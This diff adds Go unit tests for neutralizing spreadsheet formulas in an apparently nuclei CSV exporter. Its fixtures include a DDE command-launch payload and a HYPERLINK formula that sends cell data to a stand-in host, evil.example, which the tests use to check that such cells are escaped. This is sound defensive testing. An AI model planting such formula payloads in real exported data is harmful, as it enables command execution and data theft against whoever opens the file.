@@ -271,3 +271,108 @@ func TestCSVExporterFlushesRowsBeforeClose(t *testing.T) {
 
 	require.NoError(t, exporter.Close())
 }
+
+// TestCSVExporterNeutralizesSpreadsheetFormulas covers the second half of the
+// escaping problem. encoding/csv stops a value from breaking out of its cell,
+// but it does not stop a spreadsheet from evaluating that cell as a formula.
+// ExtractedResults in particular is raw response-derived data, so a target can
+// choose exactly what lands in it.
+func TestCSVExporterNeutralizesSpreadsheetFormulas(t *testing.T) {
+	const (
+		ddePayload       = `=cmd|'/C calc'!A0`
+		hyperlinkPayload = `=HYPERLINK("http://evil.example/log?d="&A1,"click")`
+		atPayload        = `@SUM(1+1)`
+		plusPayload      = `+1+1`
+		tabPayload       = "\t=1+1"
+		crPayload        = "\r=1+1"
+		safeValue        = "http://127.0.0.1:8080/index.html"
+		negativeNumber   = "-1"
+	)
+
+	event := &output.ResultEvent{
+		TemplateID: ddePayload,
+		Type:       "http",
+		Info: model.Info{
+			Name:           atPayload,
+			Description:    plusPayload,
+			Reference:      stringslice.NewRawStringSlice([]string{safeValue, hyperlinkPayload}),
+			SeverityHolder: severity.Holder{Severity: severity.High},
+			Classification: &model.Classification{
+				CVSSScore: 9.8,
+			},
+		},
+		Host:             tabPayload,
+		Matched:          safeValue,
+		MatcherName:      crPayload,
+		ExtractedResults: []string{safeValue, ddePayload, negativeNumber, hyperlinkPayload},
+		CURLCommand:      ddePayload,
+		Timestamp:        time.Date(2025, 6, 1, 0, 0, 0, 0, time.UTC),
+	}
+
+	records := export(t, event)
+	require.Len(t, records, 2)
+	row := records[1]
+	require.Len(t, row, len(header))
+
+	// every formula-triggering cell is prefixed with a single apostrophe, and
+	// the original value is recoverable by removing exactly that apostrophe
+	for _, tc := range []struct {
+		column string
+		want   string
+	}{
+		{"template-id", ddePayload},
+		{"template-name", atPayload},
+		{"description", plusPayload},
+		{"host", tabPayload},
+		{"matcher-name", crPayload},
+		{"curl-command", ddePayload},
+	} {
+		got := row[column(t, tc.column)]
+		require.Equal(t, "'"+tc.want, got, "column %s must be neutralized", tc.column)
+		require.Equal(t, tc.want, strings.TrimPrefix(got, "'"), "column %s must stay recoverable", tc.column)
+	}
+
+	// values that are not formulas are left byte-for-byte alone, so the export
+	// does not become littered with apostrophes
+	require.Equal(t, safeValue, row[column(t, "matched-at")])
+	require.Equal(t, "high", row[column(t, "severity")])
+	// a numeric cell stays numeric and sortable rather than becoming text
+	require.Equal(t, "9.8", row[column(t, "cvss-score")])
+
+	// multi-value cells are neutralized per element, not just at the start of
+	// the cell, because consumers split these cells back apart
+	require.Equal(t,
+		[]string{safeValue, "'" + ddePayload, negativeNumber, "'" + hyperlinkPayload},
+		strings.Split(row[column(t, "extracted-results")], "\n"))
+	require.Equal(t,
+		[]string{safeValue, "'" + hyperlinkPayload},
+		strings.Split(row[column(t, "reference")], "\n"))
+}
+
+func TestNeutralizeFormula(t *testing.T) {
+	for _, tc := range []struct {
+		name  string
+		input string
+		want  string
+	}{
+		{"empty", "", ""},
+		{"plain text", "nuclei", "nuclei"},
+		{"url", "http://example.com/a=b", "http://example.com/a=b"},
+		{"equals", "=1+1", "'=1+1"},
+		{"plus", "+1+1", "'+1+1"},
+		{"at", "@SUM(1)", "'@SUM(1)"},
+		{"tab", "\t=1+1", "'\t=1+1"},
+		{"carriage return", "\r=1+1", "'\r=1+1"},
+		{"negative integer stays numeric", "-1", "-1"},
+		{"negative float stays numeric", "-1.5", "-1.5"},
+		{"positive signed number stays numeric", "+9.8", "+9.8"},
+		{"minus leading text is neutralized", "-cmd|'/C calc'!A0", "'-cmd|'/C calc'!A0"},
+		{"leading space is not a trigger", " =1+1", " =1+1"},
+		{"already neutralized is left alone", "'=1+1", "'=1+1"},
+		{"non-ascii leading rune", "é=1+1", "é=1+1"},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			require.Equal(t, tc.want, neutralizeFormula(tc.input))
+		})
+	}
+}
